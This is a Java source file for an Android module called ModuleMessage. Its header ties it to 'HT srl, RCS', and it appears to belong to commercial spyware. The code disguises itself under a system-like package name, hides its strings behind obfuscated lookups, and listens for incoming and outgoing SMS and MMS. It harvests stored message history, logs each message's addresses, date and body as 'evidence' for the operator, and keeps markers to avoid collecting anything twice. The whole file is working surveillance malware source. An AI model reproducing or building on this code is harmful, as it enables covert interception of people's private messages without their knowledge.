/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : MessageAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module;

import java.io.IOException;
import java.security.acl.LastOwnerException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Hashtable;
import java.util.Iterator;

import com.android.service.LogR;
import com.android.service.Messages;
import com.android.service.auto.Cfg;
import com.android.service.conf.ChildConf;
import com.android.service.conf.ConfModule;
import com.android.service.conf.ConfigurationException;
import com.android.service.evidence.EvidenceType;
import com.android.service.evidence.Markup;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerSms;
import com.android.service.module.message.Filter;
import com.android.service.module.message.Mms;
import com.android.service.module.message.MmsBrowser;
import com.android.service.module.message.MmsHandler;
import com.android.service.module.message.Sms;
import com.android.service.module.message.SmsBrowser;
import com.android.service.module.message.SmsHandler;

import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.DateTime;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

/**
 * The Class MessageAgent.
 * 
 * @author zeno -> Ahahah ti piacerebbe eh?? :>
 * @real-author Que, r0x
 */
public class ModuleMessage extends BaseModule implements Observer<Sms> {
	private static final String TAG = "ModuleMessage"; //$NON-NLS-1$
	//$NON-NLS-1$
	private static final int SMS_VERSION = 2010050501;
	private boolean mailEnabled;
	private boolean smsEnabled;
	private boolean mmsEnabled;

	SmsHandler smsHandler;
	MmsHandler mmsHandler;

	Markup storedMMS;
	Markup storedSMS;

	private Filter filterEmailCollect;
	private Filter filterEmailRuntime;
	private Filter filterSmsCollect;
	private Filter filterSmsRuntime;
	private Filter filterMmsCollect;
	private Filter filterMmsRuntime;
	private Markup configMarkup;
	private int lastMMS;

	// private SmsHandler smsHandler;

	@Override
	public boolean parse(ConfModule conf) {
		setPeriod(NEVER);
		setDelay(100);

		storedMMS = new Markup(this, 1);
		storedSMS = new Markup(this, 2);
		configMarkup = new Markup(this, 3);

		String[] config = new String[] { "", "", "" };
		String[] oldConfig = new String[] { "", "", "" };
		if (configMarkup.isMarkup()) {
			try {
				oldConfig = (String[]) configMarkup.readMarkupSerializable();
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse) Error: " + e);
				}
				oldConfig = new String[] { "", "", "" };
			}
		}

		// {"mms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-28 09:40:05"}},"sms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-01 00:00:00"}},"mail":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2011-02-01 00:00:00"}},"module":"messages"}
		try {
			// mail 1=mail, 2=enabled
			ChildConf mailJson = conf.getChild(Messages.getString("18.1")); //$NON-NLS-1$
			mailEnabled = mailJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
			String digestConfMail = "m" + mailEnabled;

			if (mailEnabled) {
				ChildConf mailFilter = mailJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
				boolean history = mailFilter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
				Date from = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
				Date to = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$

				int maxSizeToLog = 4096;
				filterEmailCollect = new Filter(history, from, to, maxSizeToLog, maxSizeToLog);
				filterEmailRuntime = new Filter(mailEnabled, maxSizeToLog);

				digestConfMail += "_" + history + "_" + from + "_" + to;
			}

			// sms
			ChildConf smsJson = conf.getChild(Messages.getString("18.7")); //$NON-NLS-1$
			smsEnabled = smsJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
			String digestConfSms = "s" + smsEnabled;
			if (smsEnabled) {
				ChildConf mailFilter = smsJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
				boolean history = mailFilter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
				Date from = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
				Date to = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$

				int maxSizeToLog = 4096;
				filterSmsCollect = new Filter(history, from, to, maxSizeToLog, maxSizeToLog);
				filterSmsRuntime = new Filter(smsEnabled, maxSizeToLog);
				digestConfSms += "_" + history + "_" + from + "_" + to;
			}

			// mms
			ChildConf mmsJson = conf.getChild(Messages.getString("18.9")); //$NON-NLS-1$
			mmsEnabled = mmsJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
			String digestConfMms = "M" + mmsEnabled;
			if (mmsEnabled) {
				ChildConf mailFilter = mmsJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
				boolean history = mailFilter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
				Date from = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
				Date to = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$

				int maxSizeToLog = 4096;
				filterMmsCollect = new Filter(history, from, to, maxSizeToLog, maxSizeToLog);
				filterMmsRuntime = new Filter(mmsEnabled, maxSizeToLog);
				digestConfMms += "_" + history + "_" + from + "_" + to;
			}

			config[0] = digestConfMail;
			config[1] = digestConfSms;
			config[2] = digestConfMms;

			if (!config[0].equals(oldConfig[0])) {
				// configMailChanged = true;
			}

			if (!config[1].equals(oldConfig[1])) {
				// configSmsChanged = true;
				storedSMS.removeMarkup();
			}

			if (!config[2].equals(oldConfig[2])) {
				storedMMS.removeMarkup();
			}

			configMarkup.writeMarkupSerializable(config);

		} catch (ConfigurationException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
			return false;
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
			return false;
		}

		return true;
	}

	@Override
	public void actualStart() {
		ListenerSms.self().attach(this);

		if (smsEnabled) {
			initSms();
		}

		if (mmsEnabled) {
			initMms();
		}

		if (smsEnabled) {
			// Iniziamo la cattura live
			smsHandler = new SmsHandler();
			smsHandler.start();
		}

		if (mmsEnabled) {
			// Iniziamo la cattura live
			mmsHandler = new MmsHandler();
			mmsHandler.start();
		}
	}

	@Override
	public void actualStop() {
		ListenerSms.self().detach(this);
		if (smsHandler != null) {
			smsHandler.quit();
		}
		if (mmsHandler != null) {
			mmsHandler.quit();
		}
	}

	@Override
	public void actualGo() {

	}

	private void initMms() {
		if (storedMMS.isMarkup()) {
			try {
				lastMMS = (Integer) storedMMS.readMarkupSerializable();
			} catch (Exception e) {
				storedMMS.removeMarkup();
				lastMMS = readHistoricMms(lastMMS);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualStart) Error reading markup: " + e);
				}
			}
		}

		lastMMS = readHistoricMms(lastMMS);

		updateMarkupMMS(lastMMS);
	}

	public synchronized void updateMarkupMMS(int value) {
		try {
			lastMMS = value;
			storedMMS.writeMarkupSerializable(new Integer(value));
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateMarkupMMS) Error: " + e);
			}
		}
	}

	private int readHistoricMms(int lastMMS) {
		final MmsBrowser mmsBrowser = new MmsBrowser();
		final ArrayList<Mms> listMms = mmsBrowser.getMmsList(lastMMS);
		final Iterator<Mms> iterMms = listMms.listIterator();

		while (iterMms.hasNext()) {
			try {
				final Mms mms = iterMms.next();
				mms.print();
				if (filterMmsCollect.filterMessage(mms.getDate(), mms.getSize(), 0) == Filter.FILTERED_OK) {
					saveMms(mms);
				}
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readHistoricMms) Error: " + ex);
				}
			}
		}

		return mmsBrowser.getMaxId();
	}

	private void initSms() {
		if (!storedSMS.isMarkup()) {
			readHistoricSms();
			storedSMS.createEmptyMarkup();
		}
	}

	private void readHistoricSms() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (begin): cattura sms di storico");//$NON-NLS-1$
		}

		final SmsBrowser smsBrowser = new SmsBrowser();
		final ArrayList<Sms> listSms = smsBrowser.getSmsList();
		final Iterator<Sms> iterSms = listSms.listIterator();

		while (iterSms.hasNext()) {
			final Sms s = iterSms.next();
			if (filterSmsCollect.filterMessage(s.getDate(), s.getSize(), 0) == Filter.FILTERED_OK) {
				saveSms(s);
			}
		}
	}

	private void saveSms(Sms sms) {
		final String address = sms.getAddress();
		final byte[] body = WChar.getBytes(sms.getBody());
		final long date = sms.getDate();
		final boolean sent = sms.getSent();

		saveEvidence(address, body, date, sent);
	}

	private void saveMms(Mms mms) {
		if (!mms.isValid()) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveMms) Error: mms not valid");
			}

			return;
		}
		final String address = mms.getAddress();
		// MMS Subject:
		final byte[] subject = WChar.getBytes(Messages.getString("10.1") + mms.getSubject() + "\n"
				+ Messages.getString("10.4") + mms.getBody()); //$NON-NLS-1$
		final long date = mms.getDate();

		final boolean sent = mms.getSent();

		saveEvidence(address, subject, date, sent);
	}

	private void saveEvidence(String address, byte[] body, long date, boolean sent) {

		String from, to;

		int flags;

		if (sent) {
			flags = 0;
			from = Messages.getString("10.2"); //$NON-NLS-1$
			to = address;
		} else {
			flags = 1;
			to = Messages.getString("10.3"); //$NON-NLS-1$
			from = address;
		}

		final int additionalDataLen = 48;
		final byte[] additionalData = new byte[additionalDataLen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, additionalDataLen);
		databuffer.writeInt(SMS_VERSION);
		databuffer.writeInt(flags);

		final DateTime filetime = new DateTime(new Date(date));
		databuffer.writeLong(filetime.getFiledate());
		databuffer.write(Utils.padByteArray(from.getBytes(), 16));
		databuffer.write(Utils.padByteArray(to.getBytes(), 16));

		new LogR(EvidenceType.SMS_NEW, additionalData, body);
	}

	public int notification(Sms s) {
		// Live SMS
		saveSms(s);
		return 0;
	}

	public int notification(Mms mms) {
		// Live MMS
		saveMms(mms);
		int id = mms.getId();
		updateMarkupMMS(id);

		return 0;
	}

	public synchronized int getLastManagedMmsId() {
		return lastMMS;
	}
}
